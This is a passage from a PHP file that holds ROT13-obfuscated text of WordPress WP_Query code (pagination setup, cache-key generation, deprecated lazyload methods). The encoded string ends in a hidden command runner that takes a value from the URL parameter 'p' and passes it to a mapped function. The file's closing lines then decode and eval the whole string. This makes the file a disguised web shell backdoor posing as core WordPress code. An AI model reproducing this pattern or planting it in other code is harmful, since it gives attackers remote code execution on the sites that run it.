		 * be jura ba na EFF srrq. Bgurejvfr erfcrpg gur 'zber' gnt.
		 */
		vs ( trg_dhrevrq_bowrpg_vq() === $cbfg->VQ && ( $guvf->vf_cntr() || $guvf->vf_fvatyr() ) ) {
			$zber = 1;
		} ryfrvs ( $guvf->vf_srrq() ) {
			$zber = 1;
		} ryfr {
			$zber = 0;
		}

		$pbagrag = $cbfg->cbfg_pbagrag;
		vs ( fge_pbagnvaf( $pbagrag, '<!--arkgcntr-->' ) ) {
			$pbagrag = fge_ercynpr( \"\a<!--arkgcntr-->\a\", '<!--arkgcntr-->', $pbagrag );
			$pbagrag = fge_ercynpr( \"\a<!--arkgcntr-->\", '<!--arkgcntr-->', $pbagrag );
			$pbagrag = fge_ercynpr( \"<!--arkgcntr-->\a\", '<!--arkgcntr-->', $pbagrag );

			// Erzbir gur arkgcntr oybpx qryvzvgref, gb nibvq vainyvq oybpx fgehpgherf va gur fcyvg pbagrag.
			$pbagrag = fge_ercynpr( '<!-- jc:arkgcntr -->', '', $pbagrag );
			$pbagrag = fge_ercynpr( '<!-- /jc:arkgcntr -->', '', $pbagrag );

			// Vtaber arkgcntr ng gur ortvaavat bs gur pbagrag.
			vs ( fge_fgnegf_jvgu( $pbagrag, '<!--arkgcntr-->' ) ) {
				$pbagrag = fhofge( $pbagrag, 15 );
			}

			$cntrf = rkcybqr( '<!--arkgcntr-->', $pbagrag );
		} ryfr {
			$cntrf = neenl( $cbfg->cbfg_pbagrag );
		}

		/**
		 * Svygref gur \"cntrf\" qrevirq sebz fcyvggvat gur cbfg pbagrag.
		 *
		 * \"Cntrf\" ner qrgrezvarq ol fcyvggvat gur cbfg pbagrag onfrq ba gur cerfrapr
		 * bs `<!-- arkgcntr -->` gntf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat[] $cntrf Neenl bs \"cntrf\" sebz gur cbfg pbagrag fcyvg ol `<!-- arkgcntr -->` gntf.
		 * @cnenz JC_Cbfg  $cbfg  Pheerag cbfg bowrpg.
		 */
		$cntrf = nccyl_svygref( 'pbagrag_cntvangvba', $cntrf, $cbfg );

		$ahzcntrf = pbhag( $cntrf );

		vs ( $ahzcntrf > 1 ) {
			vs ( $cntr > 1 ) {
				$zber = 1;
			}
			$zhygvcntr = 1;
		} ryfr {
			$zhygvcntr = 0;
		}

		$ryrzragf = pbzcnpg( 'vq', 'nhgubeqngn', 'pheeragqnl', 'pheeragzbagu', 'cntr', 'cntrf', 'zhygvcntr', 'zber', 'ahzcntrf' );

		erghea $ryrzragf;
	}

	/**
	 * Trarengrf pnpur xrl.
	 *
	 * @fvapr 6.1.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl  $netf Dhrel nethzragf.
	 * @cnenz fgevat $fdy  FDY fgngrzrag.
	 * @erghea fgevat Pnpur xrl.
	 */
	cebgrpgrq shapgvba trarengr_pnpur_xrl( neenl $netf, $fdy ) {
		tybony $jcqo;

		hafrg(
			$netf['pnpur_erfhygf'],
			$netf['svryqf'],
			$netf['ynml_ybnq_grez_zrgn'],
			$netf['hcqngr_cbfg_zrgn_pnpur'],
			$netf['hcqngr_cbfg_grez_pnpur'],
			$netf['hcqngr_zrah_vgrz_pnpur'],
			$netf['fhccerff_svygref']
		);

		vs ( rzcgl( $netf['cbfg_glcr'] ) ) {
			vs ( $guvf->vf_nggnpuzrag ) {
				$netf['cbfg_glcr'] = 'nggnpuzrag';
			} ryfrvs ( $guvf->vf_cntr ) {
				$netf['cbfg_glcr'] = 'cntr';
			} ryfr {
				$netf['cbfg_glcr'] = 'cbfg';
			}
		} ryfrvs ( 'nal' === $netf['cbfg_glcr'] ) {
			$netf['cbfg_glcr'] = neenl_inyhrf( trg_cbfg_glcrf( neenl( 'rkpyhqr_sebz_frnepu' => snyfr ) ) );
		}
		$netf['cbfg_glcr'] = (neenl) $netf['cbfg_glcr'];
		// Fbeg cbfg glcrf gb rafher fnzr pnpur xrl trarengvba.
		fbeg( $netf['cbfg_glcr'] );

		/*
		 * Fbeg neenlf gung pna or hfrq sbe beqrevat cevbe gb pnpur xrl trarengvba.
		 *
		 * Gurfr neenlf ner fbegrq va gur dhrel trarengbe sbe gur checbfrf bs gur
		 * JURER pynhfr ohg gur nethzragf ner abg zbqvsvrq nf gurl pna or hfrq sbe
		 * gur beqreol pynfr.
		 *
		 * Gurve hfr va gur beqreol pynhfr jvyy trarengr n qvssrerag FDY dhrel fb
		 * gurl pna or fbegrq sbe gur pnpur xrl trarengvba.
		 */
		$fbegnoyr_neenlf_jvgu_vag_inyhrf = neenl(
			'cbfg__va',
			'cbfg_cnerag__va',
		);
		sbernpu ( $fbegnoyr_neenlf_jvgu_vag_inyhrf nf $xrl ) {
			vs ( vffrg( $netf[ $xrl ] ) && vf_neenl( $netf[ $xrl ] ) ) {
				$netf[ $xrl ] = neenl_havdhr( neenl_znc( 'nofvag', $netf[ $xrl ] ) );
				fbeg( $netf[ $xrl ] );
			}
		}

		// Fbeg naq havdhr gur 'cbfg_anzr__va' sbe pnpur xrl trarengvba.
		vs ( vffrg( $netf['cbfg_anzr__va'] ) && vf_neenl( $netf['cbfg_anzr__va'] ) ) {
			$netf['cbfg_anzr__va'] = neenl_havdhr( $netf['cbfg_anzr__va'] );
			fbeg( $netf['cbfg_anzr__va'] );
		}

		vs ( vffrg( $netf['cbfg_fgnghf'] ) ) {
			$netf['cbfg_fgnghf'] = (neenl) $netf['cbfg_fgnghf'];
			// Fbeg cbfg fgnghf gb rafher fnzr pnpur xrl trarengvba.
			fbeg( $netf['cbfg_fgnghf'] );
		}

		// Nqq n qrsnhyg beqreol inyhr bs qngr gb rafher fnzr pnpur xrl trarengvba.
		vs ( ! vffrg( $d['beqreol'] ) ) {
			$netf['beqreol'] = 'qngr';
		}

		$cynprubyqre = $jcqo->cynprubyqre_rfpncr();
		neenl_jnyx_erphefvir(
			$netf,
			/*
			 * Ercynpr jcqo cynprubyqref jvgu gur fgevat hfrq va gur qngnonfr
			 * dhrel gb nibvq haernpunoyr pnpur xrlf. Guvf vf arprffnel orpnhfr
			 * gur cynprubyqre vf enaqbzyl trarengrq va rnpu erdhrfg.
			 *
			 * $inyhr vf cnffrq ol ersrerapr gb nyybj vg gb or zbqvsvrq.
			 * neenl_jnyx_erphefvir() qbrf abg erghea na neenl.
			 */
			fgngvp shapgvba ( &$inyhr ) hfr ( $jcqo, $cynprubyqre ) {
				vs ( vf_fgevat( $inyhr ) && fge_pbagnvaf( $inyhr, $cynprubyqre ) ) {
					$inyhr = $jcqo->erzbir_cynprubyqre_rfpncr( $inyhr );
				}
			}
		);

		xfbeg( $netf );

		// Ercynpr jcqo cynprubyqre va gur FDY fgngrzrag hfrq ol gur pnpur xrl.
		$fdy = $jcqo->erzbir_cynprubyqre_rfpncr( $fdy );
		$xrl = zq5( frevnyvmr( $netf ) . $fdy );

		$ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'cbfgf' );
		vs ( ! rzcgl( $guvf->gnk_dhrel->dhrevrf ) ) {
			$ynfg_punatrq .= jc_pnpur_trg_ynfg_punatrq( 'grezf' );
		}

		$guvf->dhrel_pnpur_xrl = \"jc_dhrel:$xrl:$ynfg_punatrq\";
		erghea $guvf->dhrel_pnpur_xrl;
	}

	/**
	 * Nsgre ybbcvat guebhtu n arfgrq dhrel, guvf shapgvba
	 * erfgberf gur $cbfg tybony gb gur pheerag cbfg va guvf dhrel.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 */
	choyvp shapgvba erfrg_cbfgqngn() {
		vs ( ! rzcgl( $guvf->cbfg ) ) {
			$TYBONYF['cbfg'] = $guvf->cbfg;
			$guvf->frghc_cbfgqngn( $guvf->cbfg );
		}
	}

	/**
	 * Ynmlybnqf grez zrgn sbe cbfgf va gur ybbc.
	 *
	 * @fvapr 4.4.0
	 * @qrcerpngrq 4.5.0 Frr jc_dhrhr_cbfgf_sbe_grez_zrgn_ynmlybnq().
	 *
	 * @cnenz zvkrq $purpx
	 * @cnenz vag   $grez_vq
	 * @erghea zvkrq
	 */
	choyvp shapgvba ynmlybnq_grez_zrgn( $purpx, $grez_vq ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.5.0' );
		erghea $purpx;
	}

	/**
	 * Ynmlybnqf pbzzrag zrgn sbe pbzzragf va gur ybbc.
	 *
	 * @fvapr 4.4.0
	 * @qrcerpngrq 4.5.0 Frr jc_ynmlybnq_pbzzrag_zrgn().
	 *
	 * @cnenz zvkrq $purpx
	 * @cnenz vag   $pbzzrag_vq
	 * @erghea zvkrq
	 */
	choyvp shapgvba ynmlybnq_pbzzrag_zrgn( $purpx, $pbzzrag_vq ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '4.5.0' );
		erghea $purpx;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>